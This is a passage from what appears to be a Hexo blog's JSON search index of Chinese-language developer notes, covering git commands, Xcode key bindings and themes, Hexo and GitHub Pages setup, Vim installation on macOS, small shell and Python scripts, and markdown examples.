reflog用来记录你的每一次命令\n\n\n\n### git回滚文件\n+ 查看文件的修改记录\n\n```bash\ngit log config.h\n```\n+ 查看文件版本的差别\n\n```bash\ngit diff a3551 fd681 config.h\n```\n+  回退到指定的版本\n\n```bash\ngit reset fd681 config.h\n```\n+  提交到本地参考\n\n```bash\ngit commit -m \"revert old file because commmit have a bug\"   \n```\n+ 更新到工作目录\n\n```bash\ngit checkout config.h   \n```\n+ 提交到远程仓库\n\n```bash\ngit push origin master  \n```\n\n\n### git撤销操作\n\n+ git修改文件后, 还没有add, commit.  这时撤销文件修改, 即回到上一版本的内容\n\n```bash\ngit checkout -- file\n```\n命令中的--很重要，没有--，就变成了“创建一个新分支”的命令，我们在后面的分支管理中会再次遇到git checkout命令。\n\n+ git add 文件后撤销add操作\n\n```bash\ngit reset HEAD file\n```\n\n### git解决冲突\n\n1. 建议手动解决冲突\n\n2. 命令行可以使用别人或自己的版本\n\n```bash\ngit checkout --theirs/--ours  file\n```\n\n### git全局配置\n\n+ 中文不再显示8进制  git status显示中文\n\n```bash\ngit config --global core.quotepath false\n```\n\n+ 设置代理, 因为国内一些原因下载的很慢\n\n```bash\ngit config --global http.proxy 'localhost:8123'\ngit config --global --unset http.proxy\n```\n\n+ git区分文件大小写\n\ngit默认不区分文件大小写,导致文件名改了以后git状态没有改变,需要设置一下\n\n```\ngit config core.ignorecase false\n```\n\n\n### git 分支操作\n查看分支：git branch\n\n创建分支：git branch <name>\n\n切换分支：git checkout <name>\n\n创建+切换分支：git checkout -b <name>\n\n合并某分支到当前分支：git merge <name>\n\n删除分支：git branch -d <name>\n\n\n### git 标签操作\n\n命令git tag <name>用于新建一个标签，默认为HEAD，也可以指定一个commit id；\n\ngit tag -a <tagname> -m \"blablabla...\"可以指定标签信息；\n\ngit tag -s <tagname> -m \"blablabla...\"可以用PGP签名标签；\n\n命令git tag可以查看所有标签。\n\n命令git push origin <tagname>可以推送一个本地标签；\n\n命令git push origin --tags可以推送全部未推送过的本地标签；\n\n命令git tag -d <tagname>可以删除一个本地标签；\n\n命令git push origin :refs/tags/<tagname>可以删除一个远程标签。\n\n\n### git 合并 commit\n\n```\ngit rebase -i \"合并前一个版本号\"// 合并前一个 版本号\n\n\tpick 是用commit\n\tsquash 是合并前一个\n\n:wq 退出修改合并后的 commit log\n\ngit rebase --abort 如果出现失误来撤销\n```\n\n\n### github fork后更新源仓库的代码\n\n```bash\ngit remote add upstream https://github.com/golang/go\ngit remote -v\ngit fetch upstream\ngit merge upstream/master\n```\n\n### git 增加 远程仓库 orgin(名字不一样)\n\n```\ngit remote add github git@github.com:unix2dos/dht.git\ngit push github master\n```\n\n### git 分支修改名字\n\n```\ngit branch -m 原名 新名\n```\n\n\n### git撤销操作\n\n+ git push 后撤销\n\n```\ngit revert <hash> \n```\n\n+ commit消息撤销\n\n```\ngit commit --amend -m '新的消息'\n```\n+ 回滚文件的改动(未有commit) \n\n```\ngit checkout -- <filename>\n```\n+ 回滚版本\n\n```\ngit reset --hard <hash>  (--hard强制内容回归,如果修改内容保留不加此选项)\n```\n\n+ 停止追踪一个文件\n\n你偶然把application.log加到代码库里了，现在每次你运行应用，Git都会报告在application.log里有未提交的修改。你把 *.log放到了.gitignore文件里，可文件还是在代码库里，你怎样才能让Git“撤销”对这个文件的追踪呢？\n\n```\ngit rm --cached application.log\n```\n\n\n### git lg 完美显示\n\n```\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\n```","tags":["git"],"categories":["git"]},{"title":"xcode自定义Eclipse中常用的快捷键","url":"%2Fp%2F30321ed4.html","content":"\n\n\n首先找到Xcode中的自带的配置文件\n\n```\n/Applications/Xcode.app/Contents/Frameworks/IDEKit.framework/Versions/A/Resources/IDETextKeyBindingSet.plist\n```\n这个文件里配置了一些可以设置快捷键的操作, 使用常用的编辑器打开它（需要root权限）。\n\n```\n\t<key>GDI Commands</key>\n\t<dict>\n\t\t<key>GDI Duplicate Current Line</key>\n\t\t<string>selectLine:, copy:, moveToEndOfLine:, insertNewline:, paste:, deleteBackward:</string>\n\t\t<key>GDI Delete Current Line</key>\n\t\t<string>deleteToBeginningOfLine:, moveToEndOfLine:, deleteToBeginningOfLine:, deleteBackward:, moveDown:, moveToBeginningOfLine:</string>\n\t\t<key>GDI Move Current Line Up</key>\n\t\t<string>selectLine:, cut:, moveUp:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Move Current Line Down</key>\n\t\t<string>selectLine:, cut:, moveDown:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Insert Line Above</key>\n\t\t<string>moveUp:, moveToEndOfLine:, insertNewline:</string>\n\t\t<key>GDI Insert Line Below</key>\n\t\t<string>moveToEndOfLine:, insertNewline:</string>\n\t</dict>\n```\n<!-- more -->\n把这段配置放到上面提到的IDETextKeyBindingSet.plist里，放在文件的最后的这两行之前：\n</dict>\n</plist>\n\n重启Xcode，在Xcode菜单中，打开Preferences，选中Key Binding，在右上方搜索GDI, 会出现类似下图的显示，如果没有的话，请检查上面的每步操作。\n\n","tags":["xcode"],"categories":["软件"]},{"title":"xcode主题","url":"%2Fp%2Fb884c3b7.html","content":"\n\n\n### Xcode 主题\n\n```\nhttps://github.com/tursunovic/xcode-themes\n```\n\n### elfDark\n\n```\nhttps://code.google.com/archive/p/elf-ios-resource/downloads\n\ncd /Users/liuwei/Library/Developer/Xcode/UserData/FontAndColorThemes 放进去\n```\n\n\n<!-- more -->\n\n### cat ElfDark.xccolortheme\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>DVTConsoleDebuggerInputTextColor</key>\n\t<string>1 0.986905 0.947622 1</string>\n\t<key>DVTConsoleDebuggerInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerOutputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleDebuggerOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerPromptTextColor</key>\n\t<string>1 0.036325 0.0717013 1</string>\n\t<key>DVTConsoleDebuggerPromptTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableInputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleExectuableInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableOutputTextColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTConsoleExectuableOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleTextBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTConsoleTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleTextSelectionColor</key>\n\t<string>0.416 0.869 1 1</string>\n\t<key>DVTDebuggerInstructionPointerColor</key>\n\t<string>0.705792 0.8 0.544 1</string>\n\t<key>DVTMarkupTextBackgroundColor</key>\n\t<string>0.145 0.145 0.145 1</string>\n\t<key>DVTMarkupTextBorderColor</key>\n\t<string>0.2134 0.2134 0.2134 1</string>\n\t<key>DVTMarkupTextCodeFont</key>\n\t<string>SFMono-Regular - 13.0</string>\n\t<key>DVTMarkupTextEmphasisColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextEmphasisFont</key>\n\t<string>.AppleSystemUIFontItalic - 13.0</string>\n\t<key>DVTMarkupTextInlineCodeColor</key>\n\t<string>1 1 1 0.7</string>\n\t<key>DVTMarkupTextLinkColor</key>\n\t<string>0.192442 0.469436 0.928 1</string>\n\t<key>DVTMarkupTextLinkFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextNormalColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextNormalFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextOtherHeadingColor</key>\n\t<string>1 1 1 0.5</string>\n\t<key>DVTMarkupTextOtherHeadingFont</key>\n\t<string>.AppleSystemUIFont - 18.2</string>\n\t<key>DVTMarkupTextPrimaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextPrimaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 31.2</string>\n\t<key>DVTMarkupTextSecondaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextSecondaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 23.4</string>\n\t<key>DVTMarkupTextStrongColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextStrongFont</key>\n\t<string>.AppleSystemUIFontBold - 13.0</string>\n\t<key>DVTSourceTextBackground</key>\n\t<string>0.0706522 0.0706522 0.0706522 1</string>\n\t<key>DVTSourceTextBlockDimBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTSourceTextCurrentLineHighlightColor</key>\n\t<string>0.0609167 0.0946952 0.138587 1</string>\n\t<key>DVTSourceTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTSourceTextInvisiblesColor</key>\n\t<string>0.137973 0.380435 0.195417 1</string>\n\t<key>DVTSourceTextSelectionColor</key>\n\t<string>0.0317101 0.166824 0.342391 1</string>\n\t<key>DVTSourceTextSyntaxColors</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>1 0.904 0.984 1</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>0.921429 0.70068 0.169311 1</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>0.355 0.922 0.986 1</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>0.248 0.78 0.959 1</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>0.227 0.714 0.878 1</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>0.218579 0.6826 0.839759 1</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>0.467 0.881 1 1</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>0.222 0.699 0.86 1</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>0.23 0.725 0.891 1</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>0.225 0.707 0.869 1</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>1 0.11 0.157 1</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>0.341 0.923 0.326 1</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>1 1 1 1</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>0.18956 0.673603 0.983696 1</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>1 0.761311 0.178664 1</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>0.192442 0.469436 0.928 1</string>\n\t</dict>\n\t<key>DVTSourceTextSyntaxFonts</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t</dict>\n</dict>\n</plist>\n```","tags":["xcode"],"categories":["软件"]},{"title":"hexo搭建博客","url":"%2Fp%2Fb37651.html","content":"\n### 1. 安装hexo\n\n+ 安装node.js\n+ 安装hexo\n\n\t```\n\tnpm install -g hexo-cli\n\tmkdir hexo\n\thexo init hexo\n\tcd hexo\n\t```\n\n<!-- more -->\n\n### 2. hexo配置\n\n+ 因为主站有个配置, 主题也有个配置, 建议两个配置合并一起, 需要Hexo版本在 3 以上\n\n+ 在站点的 `source/_data` 目录下新建 `next.yml` 文件（`_data`目录可能需要新建）迁移站点配置文件和主题配置文件中的配置到 `next.yml` 中(包含了`_config.yml`和`theme.yml`)\n  \n\t```\n\thexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\t```\n\t\n+ 不渲染 README\n\n  将skip_render参数的值设置上。skip_render: README.md\n  使用hexo d 命令就不会在渲染 README.md 这个文件了。\n\n\n\n### 3. github pages + 绑定域名\n\n+ 为自己的 github 生成一个公钥私钥对\n\n+ 建立带用户名的仓库 unix2dos.github.io\n\n- CNAME 放到 source 文件夹, 里面写上 www.liuvv.com\n- 向你的 DNS 配置中添加 3 条记录\n\n```\n@          A             192.30.252.153\n@          A             192.30.252.154\nwww      CNAME           unix2dos.github.io.\n```\n\n\n\n### 4. 常用命令\n\n```html\nhexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\n---\ntitle: \"\"\ndate: 2018-05-19 17:54:46\ntags:\n- golang\n- linux\n---\n\n<!-- more -->\n\n\n![1](Kademlia_DHT_KRPC_BitTorrent协议/1.png)\n```\n\n\n\n### 5. 同步hexo\n\n```shell\nnpm install hexo --save\nnpm install hexo-deployer-git --save\n\nnpm ls --depth 0  //查看丢失的包\nnpm install hexo-generator-archive --save //逐一安装缺失的包\n\n\n### hexo-next 主题\n\n# 第一台电脑\ncd themes\ngit submodule add https://github.com/unix2dos/hexo-theme-next next\ncd next\n\n# 第二台电脑\ngit submodule update --init\ncd themes/next\n\n# 分享按钮\ngit clone https://github.com/theme-next/theme-next-needmoreshare2 source/lib/needsharebutton  \n\n# 丝带\ngit clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon\n\n# 蜘蛛网\ngit clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest\n\n# 三种特效\ngit clone https://github.com/theme-next/theme-next-three source/lib/three \n\n# 特殊汉字\ngit clone https://github.com/theme-next/theme-next-han source/lib/Han\n\n# 快速点击\ngit clone https://github.com/theme-next/theme-next-fastclick source/lib/fastclick\n\n# 懒加载\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n\n# 顶部的进度\ngit clone https://github.com/theme-next/theme-next-pace source/lib/pace \n\n# 图片展示\ngit clone https://github.com/theme-next/theme-next-fancybox3 source/lib/fancybox \n\n# 文字显示加空格\ngit clone https://github.com/theme-next/theme-next-pangu.git source/lib/pangu\n\n# 读取进度\ngit clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress \n\n\n### hexo-next 插件\n\n1. npm install hexo-symbols-count-time --save   # 统计字数\n\nsymbols_count_time:\n  symbols: true\n  time: true\n  total_symbols: true\n  total_time: true\n  separated_meta: true\n  item_text_post: true\n  item_text_total: false\n  awl: 4\n  wpm: 275\n\n\n2. npm install hexo-abbrlink --save # 链接持久\n\npermalink: post/:abbrlink.html\nabbrlink:\n  alg: crc16 #support crc16(default) and crc32\n  rep: hex    #support dec(default) and hex\n  \n  \n3. npm install hexo-auto-category --save #自动分类\n\nauto_category:\n enable: true\n depth:\n \n \n4. npm install hexo-generator-searchdb --save # 本地搜索\n\nsearch:\n  path: search.json\n  field: post\n  format: html\n  limit: 10000\n  content: true\n  \n#然后打开本地local_search\nlocal_search:\n\tenable: true\n  \n\n5.  gittalk评论系统(禁止使用, 建议使用 disqus)\n\nhttps://github.com/theme-next/hexo-theme-next/pull/464\nhttps://asdfv1929.github.io/2018/01/20/gitalk/\nhttps://github.com/settings/developers\n\nHomepage URL 和 Authorization callback URL 都填写自己配置的域名\n```\n\n\n\n### 6. 问题解决方案\n\n1. 生成页面如果空白的话, 换个主题再重新生成一次\n\n2. WARN  No layout\n\n   看看主题里面究竟有没有东西,文件夹名字和主题是否对应\n   \n3. 使用链接持久后图片无法显示(https://github.com/rozbo/hexo-abbrlink/issues/19)\n\n   ```javascript\n   # vi node_modules/hexo-asset-image/index.js     #24行\n   \n   // var endPos = link.length-1; // 换成下面的这句话\n   var endPos = link.length-5; //因为我的permalink: p/:abbrlink.html,  这里要改成-5\n   ```\n   \n\n\n\n### 7. 参考资料\n\n+ https://iuok.me/posts/3159684541/ 插件\n","tags":["hexo"]},{"title":"shell批量文件内容复制到一个文件内","url":"%2Fp%2F875a198.html","content":"\n> 公司需要把所有代码放到一个文件内,加上版权信息. 于是用shell简单的处理了下\n\n```shell\n#!/bin/sh\n\nNAME=\"a.txt\"\nif [ -f $NAME ]; then\n\t`rm $NAME`\nfi\n\nDIR=\"\"\nFILE=\"\"\nfor file in `ls -R`\ndo\n\tif [ -f $file ]; then\n\t\tif [ $file = \"a.sh\" ];then\n\t\t\tcontinue\t\n\t\tfi\n#\t\techo \"===================== $file begin =====================\" >> $NAME\n#\t\t`cat $file >> $NAME`\n#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\techo $file\t\t\n\telse \n\t\tif  [ ${file:0:1} = \".\" ];then\n\t\t\tDIR=${file/://}\n\t\telse  \n\t\t\tif [ \"$DIR\" != \"\" ] && [ ${DIR:0:6} = \"./base\" ];then\n\t\t\t\tcontinue #此处可以过滤不想要的文件夹\t\n\t\t\tfi\n\t\t\tFILE=$DIR$file\n\t\t\tif [ -f $FILE ]; then\n\t\t#\t\techo \"===================== $file begin =====================\" >> $NAME\n\t\t#\t\t`cat $FILE >> $NAME`\n\t\t#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\t\t\techo $FILE\n\t\t\tfi\n\t\tfi\n\tfi\ndone\n```\n","tags":["shell"],"categories":["shell"]},{"title":"python使用正则后向引用替换字符串","url":"%2Fp%2F136fd428.html","content":">工作需要把 `Mud makes my mom mad.` 这句话带有m的加上颜色,或者把某些单词加上颜色\n>临时写了个脚本处理\n\n```python\nimport re\nimport sys\n\n\n# replace letter\n#find = \"m\"\n#str = \"Mud makes my mom mad.\"\n\n#replace key words\n#find = \"Mud|makes|mad\"\n#str  = \"Mud makes my mom mad.\"\n\n# how to use\n# python b.py \"m\"\t\"Mud makes my mom mad.\" \n# python b.py \"mud|mess|mop|make|the|help\"\t\"Mud makes my mom mad.\"\n\n\nfind  = sys.argv[1] \nstr   = sys.argv[2] \n\n\nresult = re.sub(r'('+find+')', r'<color:#ff0000>\\1</color>', str, 0, re.IGNORECASE)\nprint result\n\n```\n","tags":["python"],"categories":["python"]},{"title":"mac系统vim升级流程","url":"%2Fp%2F4ea69092.html","content":"\n#### 执行命令安装vim 注意要加上`--with-override-system-vi`\n```bash\nbrew install vim --with-override-system-vi\n```\n\n\n#### 安装过程中如果出现 ruby.h找不到\n\n执行下面的命令\n\n```bash\ncd /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk/System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/include/ruby-2.0.0/ruby\n```\n\n```bash\nsudo ln -s ../universal-darwin15/ruby/config.h ./config.h\n```\n注意不要复制上面的, 对应自己的sdk版本,ruby版本,darwin版本\n\n\n<!-- more -->\n#### 给自己的vim做个别名, 注意自己vim的版本路径\n\n```bash\nalias vim=\"/usr/local/Cellar/vim/7.4.2152/bin/vim\"\n```\n\n\n\n#### 升级vim后如果主题不显示\n把自己主题文件放到这个 `/usr/local/Cellar/vim/7.4.2152/bin/vim`里\n\n\n#### 让git也适应最新的vim\n\n```bash\ngit config --global core.editor /usr/local/Cellar/vim/7.4.2152/bin/vim\n```\n\n\n--------\n\n## 另外一种方案, 安装macvim\n\nInstall the latest version of MacVim. Yes, MacVim. And yes, the latest.\n\nIf you don't use the MacVim GUI, it is recommended to use the Vim binary that is inside the MacVim.app package (MacVim.app/Contents/MacOS/Vim). To ensure it works correctly copy the mvim script from the MacVim download to your local binary folder (for example /usr/local/bin/mvim) and then symlink it:\n\n\n\n```\nalias vim=\"/Applications/MacVim.app/Contents/MacOS/Vim\"\ngit config --global core.editor /Applications/MacVim.app/Contents/MacOS/Vim\n```\n\nIt requires Vim 7.3.885 or later with Lua support (\"+lua\").\n```\nbrew install macvim --with-lua\n```\n","tags":["vim"],"categories":["软件"]},{"title":"golang配置vim","url":"%2Fp%2F3feff448.html","content":"### 配置文件和快速设置\n- [.vimrc][1]\n- [.zhsrc][2]\n[1]: https://github.com/unix2dos/go-tutorial/blob/master/.vimrc\n[2]: https://github.com/unix2dos/go-tutorial/blob/master/.zshrc\n\n1. PlugClean\n2. PlugInstall\n3. 去到YCM里执行\n```\n./install.py --clang-completer --gocode-completer\n```\n\n\n### 安装插件管理器\n```bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n```\n\n### 安装插件\n```bash\ncall plug#begin()\nPlug 'fatih/vim-go' \"go\nPlug 'tomasr/molokai' \"主题\nPlug 'SirVer/ultisnips' \"tab补全\nPlug 'ctrlpvim/ctrlp.vim' \"快速查文件\nPlug 'Shougo/neocomplete.vim' \"实时提示\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"导航\nPlug 'vim-airline/vim-airline' \"下面\ncall plug#end()\n```\n<!-- more -->\n\n###  安装go tools需要的东西﻿\n直接使用`:GoInstallBinaries`安装\n如果网络不行(你懂的), 把代理把包都下载下来\n\n```bash\ngit clone https://go.googlesource.com/tools  \n```\n\n\n### goTags需要安装ctags\n\n```bash\nbrew install ctags\n```\n﻿\n\n### 代码实时提示neocomplete, 需要vim支持lua\n```bash\nbrew uninstall vim\nbrew install luajit\nbrew install vim --with-luajit\n```\n\n\n### Gocode autocomplete non imported packages\n```\ngocode set unimported-packages true\n```","tags":["vim"],"categories":["golang"]},{"title":"python读取文件去除html_xml标签","url":"%2Fp%2Ff3ea3847.html","content":"\n> 自己写的一个简单去除html标签(xml)的脚本\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<text font=\"Palatino Linotype\">\n<p>\n<s end_audio=\"262\" start_audio=\"13\">\n<w end_audio=\"94\" id=\"0\" start_audio=\"13\" variants=\"mud\">Mud</w>\n<w end_audio=\"122\" id=\"1\" start_audio=\"95\">makes</w>\n<w end_audio=\"140\" id=\"2\" start_audio=\"123\">my</w>\n<w end_audio=\"215\" id=\"3\" start_audio=\"141\">mom</w>\n<w end_audio=\"262\" id=\"4\" start_audio=\"216\" variants=\"mad\">mad.</w>\n</s>\n</p>\n</text>\n```\n\n```python\nimport re\nimport sys\n\n# how to use\n# pythone a.py C6M01B1-001.xml\n\nfile = sys.argv[1]\nf = open(file, 'r')\n\nres = \"\"\nfor line in f.readlines():\n\t#str = re.sub(r'</?\\w+[^>]*>','',line)\n\tstr = re.sub(r'<(/|\\?)?\\w+[^>]*>','',line)\n\tif str != '\\r\\n':\n\tres = res + str\n\tres = re.sub('\\r\\n',' ',res)\n\tprint res\n#print \"len =\",len(res)\n```\n","tags":["python"],"categories":["python"]},{"title":"markdown语法集合","url":"%2Fp%2F1ef7af3b.html","content":"\n\n> This is a blockquote.\n> \n> This is the second paragraph in the blockquote.\n>\n> ## This is an H2 in a blockquote\n\n\n\nSome of these words *are emphasized*.\n\nUse two asterisks for **strong emphasis**.\t\n\n<!-- more -->\n\t\t\n\t\t\t\t\t\n- Candy.\n- Gum.\n- Booze.\n\n\t\t\n1. Red\n2. Green\n3. Blue\n\n\nThis is an [example link](http://example.com/)\n\nI get 10 times more traffic from [Google][1] than from\n[Yahoo][2] or [MSN][a].\n\n[1]: http://google.com/ \"Google\"\n[2]: http://search.yahoo.com/ \"Yahoo Search\"\n[a]: http://search.msn.com/ \"MSN Search\"\n\n\n\n\n![alt text](/images/a.jpg \"Title\")\n\n![alt text][id]\n\n[id]: /images/a.jpg \"Title\"\n\n\nI strongly recommend against using any `<blink>` tags.\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86   \n    src=\"http://music.163.com/outchain/player?type=2&id=25706282&auto=0&height=66\">  \n</iframe> \n\n<iframe   \n    height=498 width=510   \n    src=\"http://www.iqiyi.com/v_19rr9nypk0.html\"\n    frameborder=0 allowfullscreen>  \n</iframe>  \n\n\n| Tables        | Are           | Cool  |\n| ------------- |:-------------:| -----:|\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      | centered      |   $12 |\n| zebra stripes | are neat      |    $1 |\n\n","tags":["markdown"],"categories":["计算机基础"]},{"title":"android自动添加文件到android-mk","url":"%2Fp%2F99b8fe68.html","content":"\n将\n```bash\nLOCAL_SRC_FILES := hellocpp/main.cpp \\  \n                   ../../Classes/AppDelegate.cpp \\  \n                   ../../Classes/HelloWorldScene.cpp \n```\n换成\n\n```bash\nFILE_LIST := hellocpp/main.cpp    \nFILE_LIST += $(wildcard $(LOCAL_PATH)/../../Classes/*.cpp)    \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)   \n```\n\n----\n\n<!-- more -->\n**另外一种方法:**\n\n```bash\n#遍历目录及子目录的函数  \ndefine walk  \n    $(wildcard $(1)) $(foreach e, $(wildcard $(1)/*), $(call walk, $(e)))  \nendef  \n  \n#遍历Classes目录  \nALLFILES = $(call walk, $(LOCAL_PATH)/../../Classes)  \nFILE_LIST := hellocpp/main.cpp  \n#从所有文件中提取出所有.cpp文件  \nFILE_LIST += $(filter %.cpp, $(ALLFILES))  \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)\n```\n","tags":["android"],"categories":["android"]},{"title":"gitbook--制作pdf","url":"%2Fp%2F1f9c8aa6.html","content":"\n## 命令行:\ngitbook pdf Effective-Modern-Cpp-Zh  myname.pdf\n\n\n\n### 如果无法生成 需要安装 calibre  \n\n安装后还要执行命令\nln -s /Applications/calibre.app/Contents/MacOS/ebook-convert /usr/local/bin\n\n","tags":["others"],"categories":["git"]},{"title":"我的第一篇博客","url":"%2Fp%2Fd95d7e09.html","content":"\n我的第一篇博客,写点什么好呢? \n希望以后能坚持写下去把.\n","tags":["others"],"categories":["个人记录"]}]